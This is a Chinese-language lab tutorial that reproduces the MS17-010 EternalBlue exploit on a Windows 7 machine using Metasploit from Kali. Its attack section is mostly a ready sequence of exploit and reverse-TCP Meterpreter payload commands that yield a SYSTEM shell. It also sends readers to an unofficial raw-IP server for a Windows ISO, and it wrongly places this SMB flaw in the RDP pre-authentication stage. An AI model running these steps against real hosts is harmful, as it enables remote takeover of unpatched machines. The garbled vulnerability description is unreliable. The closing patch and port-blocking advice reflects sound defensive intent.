#00漏洞描述     

 ms17-010 漏洞是一个严重的远程代码执行漏洞，Eternalblue通过TCP端口445来利用远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，就能拿下目标机器的权限，向目标Windows主机发送恶意构造请求，可以在目标系统上执行任意代码。该漏洞存在于RDP协议的预身份验证阶段无需进行用户交互操作。该漏洞存在被不法分子在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序，影响恶劣。

下面开始复现ms17-010 漏洞利用并拿下win7权限：
#01攻击环境：
目标主机window7 x64
镜像下载：http://125.70.15.180:10024/cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso
IP:192.168.1.110
注意：需要在测试的win7靶机中打开445端口，用下图命令查看端口是否打开

攻击机kali Linux:
镜像下载：https://www.kali.org/downloads/
IP:192.168.1.106
                       
 我们打开终端输入： msfconsole  打开msf，结果如下：


#02配置exploit

--Msf框架有1000多个exp文件，我们先要找到需要复现漏洞的EXP

msf5 > search ms17-01 //寻找需要复现的EXP

--然后用use命令使用我们需要的文件

msf > use exploit/windows/smb/ms17_010_eternalblue //使用这个EXP文件

--查看需要配置的选项

msf exploit(ms17_010_eternalblue) > show options //查看需要配置的选项

我们看到有yes的就是需要配置的，留意有几个已经默认设置好的，我们只需要设置：RHOSTS（目标主机的IP）其他选项默认就可以

msf exploit(ms17_010_eternalblue) > set rhost 192.168.1.110 //设置目标IPrhost => 192.168.1.110



#03配置payload

msf exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp //设置payloadpayload => windows/x64/meterpreter/reverse_tcp


--然后我们查看payload需要的配置

msf5 exploit(windows/smb/ms17_010_eternalblue) > show options  //查看payload需要的配置


可以看到我们只需要配置LHOST（本机IP）就可以了

msf exploit(ms17_010_eternalblue) > set lhost 192.168.1.106 //配置kali本机IPlhost => 192.168.1.106

#04开始攻击目标

msf exploit(ms17_010_eternalblue) >exploit //开始执行


Successful！我们成功拿下目标主机的shell，并且获取了system权限

警告：攻击过程可能导致目标机器蓝屏重启，谨慎操作！


#05漏洞防御措施
用户可打开并启用Windows防火墙，进入"高级设置"，禁用"文件和打印机共享"设置；或启用个人防火墙关闭445以及135、137、138、139等高风险端口。

修复的方法在微软的官网下载补丁
